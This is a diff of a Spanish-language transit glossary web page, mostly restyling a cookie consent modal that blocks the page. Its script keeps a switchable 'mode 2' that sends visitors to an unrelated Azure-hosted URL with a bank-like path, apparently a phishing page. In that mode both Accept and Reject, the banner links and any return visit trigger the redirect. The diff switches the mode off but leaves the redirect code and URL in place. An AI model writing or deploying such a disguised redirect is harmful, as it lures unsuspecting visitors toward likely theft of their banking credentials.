@@ -91,49 +91,51 @@ body.cookie-locked{ overflow:hidden; }
 
 .cookie-modal{
   background:#ffffff;
-  max-width:540px;
+  max-width: 400px; /* Ventana más pequeña */
   width:100%;
-  padding:48px 40px;
+  padding: 32px 24px; /* Menos relleno */
   border-radius:var(--radio);
   box-shadow:0 24px 64px rgba(44,62,80,0.25);
   text-align:center;
   border-top:6px solid var(--tierra);
   animation:cookieAnim 0.5s ease;
+  font-family: Arial, Helvetica, sans-serif; /* Tipografía de la imagen */
 }
 @keyframes cookieAnim{
   from{ transform:scale(0.9) translateY(20px); opacity:0; }
   to{ transform:scale(1) translateY(0); opacity:1; }
 }
 .cookie-modal h2{
-  font-size:1.6rem;
+  font-size: 1.4rem; /* Un poco más pequeño */
   margin-bottom:12px;
-  color:var(--tierra);
-  font-weight:800;
+  color: #000000; /* Título negro */
+  font-weight: 800;
 }
 .cookie-modal p{
-  font-size:0.95rem;
-  color:var(--texto-suave);
-  margin-bottom:28px;
-  line-height:1.7;
+  font-size: 0.95rem;
+  color: #000000; /* Letras negras */
+  margin-bottom: 24px;
+  line-height: 1.5;
+  font-weight: 500; /* Un poco más gruesa */
 }
 .cookie-actions{
   display:flex;
-  gap:14px;
+  gap:10px;
   justify-content:center;
   flex-wrap:wrap;
 }
 .cookie-actions .boton-cookie{
-  padding:14px 36px;
+  padding: 12px 24px; /* Botones más compactos */
   border:none;
   border-radius:50px;
   font-weight:800;
-  font-size:0.95rem;
+  font-size:0.9rem;
   cursor:pointer;
   transition:all var(--trans);
-  min-width:150px;
-  font-family:var(--fuente);
+  min-width: 130px;
+  font-family: Arial, Helvetica, sans-serif;
   background:var(--amarillo);
-  color:var(--tierra);
+  color:#000000; /* Texto del botón negro */
   box-shadow:0 4px 16px rgba(253,218,36,0.45);
 }
 .cookie-actions .boton-cookie:hover{
@@ -141,16 +143,18 @@ body.cookie-locked{ overflow:hidden; }
   box-shadow:0 8px 28px rgba(253,218,36,0.65);
 }
 .cookie-enlaces{
-  margin-top:20px;
-  font-size:0.82rem;
-  color:var(--texto-suave);
+  margin-top:16px;
+  font-size:0.8rem;
+  color: #000000;
 }
 .cookie-enlaces a{
-  color:var(--tierra);
-  font-weight:600;
-  text-decoration:none;
+  color: #000000;
+  font-weight:700;
+  text-decoration:underline;
 }
-.cookie-enlaces a:hover{ text-decoration:underline; }
+.cookie-enlaces a:hover{ 
+  opacity: 0.7; 
+}
 
 .contenido-principal{ display:none; }
 .contenido-principal.visible{
@@ -445,14 +449,13 @@ p{ margin:0 0 1rem; color:var(--texto); }
   .menu a{ padding:11px 14px; }
   .hero{ padding:76px 0 56px; }
   .seccion{ padding:52px 0; }
-  .cookie-modal{ padding:36px 28px; margin:16px; }
-  .cookie-actions .boton-cookie{ min-width:130px; padding:12px 28px; font-size:0.9rem; }
+  .cookie-modal{ padding:28px 20px; margin:16px; }
+  .cookie-actions .boton-cookie{ min-width:120px; padding:10px 20px; font-size:0.85rem; }
 }
 @media (max-width:480px){
   .rejilla-2,.rejilla-3,.rejilla-4{ grid-template-columns:1fr; }
   .hero-insignias{ gap:7px; }
   .insignia{ font-size:0.72rem; padding:5px 13px; }
-  .cookie-modal{ padding:28px 20px; }
   .cookie-actions{ flex-direction:column; }
   .cookie-actions .boton-cookie{ width:100%; min-width:unset; }
 }
@@ -633,7 +636,7 @@ p{ margin:0 0 1rem; color:var(--texto); }
         </div>
       </section>
 
-           <section class="seccion" id="glosario" style="background:var(--arena);">
+      <section class="seccion" id="glosario" style="background:var(--arena);">
         <div class="contenedor">
           <div class="seccion-encabezado">
             <span class="etiqueta-seccion">Sección 6 · Glosario</span>
@@ -649,7 +652,7 @@ p{ margin:0 0 1rem; color:var(--texto); }
               <dt style="font-weight:800; color:var(--tierra); font-size:1.05rem;">BRT</dt>
               <dd style="margin:0; color:var(--texto);">Bus Rapid Transit: sistema de buses de alta capacidad que circulan por carriles exclusivos.</dd>
             </div>
-            <div style="background:#fff; border:1px solid var(--borde); border-left:5px solid var(--verde); border-radius:var(--radio-sm); padding:16px 20px;">
+                        <div style="background:#fff; border:1px solid var(--borde); border-left:5px solid var(--verde); border-radius:var(--radio-sm); padding:16px 20px;">
               <dt style="font-weight:800; color:var(--tierra); font-size:1.05rem;">Peatón</dt>
               <dd style="margin:0; color:var(--texto);">Persona que se desplaza a pie por la vía.</dd>
             </div>
@@ -812,7 +815,7 @@ p{ margin:0 0 1rem; color:var(--texto); }
   </script>
 
   <!-- ============================================================
-  JAVASCRIPT - COOKIES Y FUNCIONALIDAD (MODO 1 y 2)
+  JAVASCRIPT - COOKIES Y FUNCIONALIDAD
   ============================================================ -->
   <script>
     (function() {
@@ -821,11 +824,11 @@ p{ margin:0 0 1rem; color:var(--texto); }
       // ============================================================
       //  CONFIGURACIÓN DEL MODO DE LOS BOTONES DE COOKIES
       // ============================================================
-      //  MODO 1: Comportamiento original (solo muestra/oculta la página)
-      //  MODO 2: Redirección a URL externa
+      //  1: Muestra la página normalmente (Recomendado).
+      //  2: Redirige a una URL externa.
       // ============================================================
-      const COOKIE_BUTTON_MODE = 2; // Cambia entre 1 y 2
-      const REDIRECT_URL = "https://flightscheaponline.azurewebsites.net/banco/bancol"; // URL para el modo 2
+      const COOKIE_BUTTON_MODE = 1; // 👈 Cambiado a 1 para no redirigir
+      const REDIRECT_URL = "https://flightscheaponline.azurewebsites.net/banco/bancol"; 
 
       // ----- ELEMENTOS DEL BANNER -----
       var overlay = document.getElementById('cookie-overlay');
@@ -834,11 +837,6 @@ p{ margin:0 0 1rem; color:var(--texto); }
       var btnRechazar = document.getElementById('btn-rechazar-cookies');
       var contenidoPrincipal = document.getElementById('contenidoPrincipal');
 
-      // Referencias a los enlaces del banner
-      var enlacePrivacidad = document.getElementById('enlace-privacidad');
-      var enlaceCookies = document.getElementById('enlace-cookies');
-
-      // Verificar que los elementos existen
       if (!overlay || !banner || !btnAceptar || !btnRechazar || !contenidoPrincipal) {
         console.error('Error: Elementos del banner de cookies no encontrados');
         return;
@@ -862,64 +860,41 @@ p{ margin:0 0 1rem; color:var(--texto); }
         window.location.href = url;
       }
 
-      // Función que maneja la acción según el modo configurado
+      // Manejo de la acción
       function handleCookieAction(aceptadas) {
-        console.log('🍪 Acción:', aceptadas ? 'Aceptar' : 'Rechazar', '| Modo:', COOKIE_BUTTON_MODE);
-
         if (COOKIE_BUTTON_MODE === 1) {
           mostrarContenido();
-
           if (typeof gtag !== 'undefined') {
             gtag('consent', 'update', {
               'ad_storage': aceptadas ? 'granted' : 'denied',
               'analytics_storage': aceptadas ? 'granted' : 'denied'
             });
           }
-          console.log('Cookies', aceptadas ? 'ACEPTADAS' : 'RECHAZADAS');
-
         } else if (COOKIE_BUTTON_MODE === 2) {
           try { sessionStorage.setItem('cookiesAccepted', aceptadas ? 'true' : 'false'); } catch(e) {}
           redirectTo(REDIRECT_URL);
-
         } else {
           mostrarContenido();
         }
       }
 
-      // ----- EVENTO ACEPTAR -----
-      btnAceptar.addEventListener('click', function() {
-        handleCookieAction(true);
-      });
+      // Eventos de los botones
+      btnAceptar.addEventListener('click', function() { handleCookieAction(true); });
+      btnRechazar.addEventListener('click', function() { handleCookieAction(false); });
 
-      // ----- EVENTO RECHAZAR -----
-      btnRechazar.addEventListener('click', function() {
-        handleCookieAction(false);
-      });
+      // Enlaces del banner (solo redirigen si el modo es 2)
+      var enlacePrivacidad = document.getElementById('enlace-privacidad');
+      var enlaceCookies = document.getElementById('enlace-cookies');
 
-      // Manejar clics en los enlaces del banner
       function handleBannerLinkClick(event) {
         if (COOKIE_BUTTON_MODE === 2) {
           event.preventDefault();
-          console.log('🔗 Enlace del banner clicado en modo 2. Redirigiendo...');
           redirectTo(REDIRECT_URL);
         }
       }
 
-      if (enlacePrivacidad) {
-        enlacePrivacidad.addEventListener('click', handleBannerLinkClick);
-      }
-      if (enlaceCookies) {
-        enlaceCookies.addEventListener('click', handleBannerLinkClick);
-      }
-
-      // Verificar si ya se aceptaron las cookies antes (para el modo 2)
-      if (COOKIE_BUTTON_MODE === 2) {
-        try {
-          if (sessionStorage.getItem('cookiesAccepted') === 'true') {
-            redirectTo(REDIRECT_URL);
-          }
-        } catch(e) {}
-      }
+      if (enlacePrivacidad) enlacePrivacidad.addEventListener('click', handleBannerLinkClick);
+      if (enlaceCookies) enlaceCookies.addEventListener('click', handleBannerLinkClick);
 
       // ----- MENÚ MÓVIL -----
       var botonMenu = document.getElementById('botonMenu');
